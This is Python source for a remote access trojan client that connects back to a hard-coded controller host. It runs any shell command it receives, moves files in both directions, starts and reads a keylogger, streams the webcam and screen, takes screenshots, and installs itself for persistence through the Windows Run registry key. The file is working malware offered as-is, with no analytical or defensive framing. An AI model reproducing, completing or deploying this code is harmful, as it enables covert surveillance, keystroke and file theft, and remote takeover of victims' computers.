import sys
import time
import socket
import json
import subprocess
from subprocess import PIPE
import os
from kaylog import KeyLogger
import threading
import cv2
import pickle
import struct
import pyautogui
import pygame
from PIL import ImageGrab
import numpy as np
import shutil

#setup ip and port
hostIP = '192.168.1.10'
connPort = 9981
webcamPort = 9998
screenPort = 9988

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def receive_cmd():
    data = ''
    while True:
        try:
            data = data + sc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(fileName):
    file = open(fileName, 'rb')
    sc.send(file.read())
    file.close

def download_file(fileName):
    file = open(fileName, 'wb')
    sc.settimeout(1)
    _file = sc.recv(1024)
    while _file:
        file.write(_file)
        try:
            _file = sc.recv(1024)
        except socket.timeout as e:
            break
    sc.settimeout(None)
    file.close()

def open_log():
    sc.send(KeyLogger().read_log().encode())

def log_thread():
    t = threading.Thread(target=open_log)
    t.start

def stream_byte():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((hostIP, webcamPort))
    vid = cv2.VideoCapture(0)
    while(vid.isOpened()):
        img, frame = vid.read()
        b = pickle.dumps(frame)
        message = struct.pack("Q", len(b))+b
        sock.sendall(message)

def send_stream_byte():
    t = threading.Thread(target=stream_byte)
    t.start()

def byte_stream_recorder():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((hostIP, screenPort))

    screen = pygame.display.set_mode((0,0), pygame.FULLSCREEN)
    screen = screen.get_size()
    WIDTH = screen[0]
    HEIGHT = screen[1]

    while True:
        img = ImageGrab.grab(bbox=(0,0,WIDTH,HEIGHT))
        capture = np.array(img)
        capture = cv2.cvtColor(capture, cv2.COLOR_BGR2RGB)
        b = pickle.dumps(capture)
        message = struct.pack("i", len(b))+b
        sock.sendall(message)

def send_stream_byte_recorder():
    t = threading.Thread(target=byte_stream_recorder) 
    t.start

def run_persistence(registry_name,executable_file):
    file_path = os.environ['appdata']+'\\'+ executable_file
    try:
        if not os.path.exists(file_path):
            shutil.copyfile(sys.executable, file_path)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + registry_name + ' /t REG_SZ /d "' + file_path + '"', shell=True)
        else:
            pass
    except:
        pass

def execute_cmd():
    while True:
        cmd = receive_cmd()
        if cmd in ('exit', 'quit'):
            break
        elif cmd == 'clear':
            pass
        elif cmd[:3] == 'cd ': #[:3] from first index to 3
            os.chdir(cmd[3:]) #[3:] = from index 3 to last
        elif cmd[:8] == 'download':
            upload_file(cmd[9:])
        elif cmd[:6] == 'upload':
            download_file(cmd[7:])
        elif cmd == 'kaylog':
            KeyLogger().start_logger()
        elif cmd == 'readlogger':
            log_thread()
        elif cmd == 'stoplogger':
            KeyLogger().stop_listener()
        elif cmd == 'startcam':
            send_stream_byte()
        elif cmd == 'screenshot':
            ss = pyautogui.screenshot()
            ss.save('ss.png')
            upload_file('ss.png')
        elif cmd == 'sharescreen':
            send_stream_byte_recorder()
        elif cmd[:9] == 'humbl3g0d':
            registry_name, executable_file = cmd[10:].split(' ')
            run_persistence(registry_name,executable_file)
        else:
            execute = subprocess.Popen(
                cmd,
                shell=True,
                stdout=PIPE,
                stderr=PIPE,
                stdin=PIPE
            )
            data = execute.stdout.read() + execute.stderr.read()
            data = data.decode()
            output = json.dumps(data)
            sc.send(output.encode())

def execute_persistence():
    while True:
        try:
            time.sleep(10)
            sc.connect((hostIP, connPort))
            execute_cmd()
            sc.close
            break
        except:
            execute_persistence()

execute_persistence()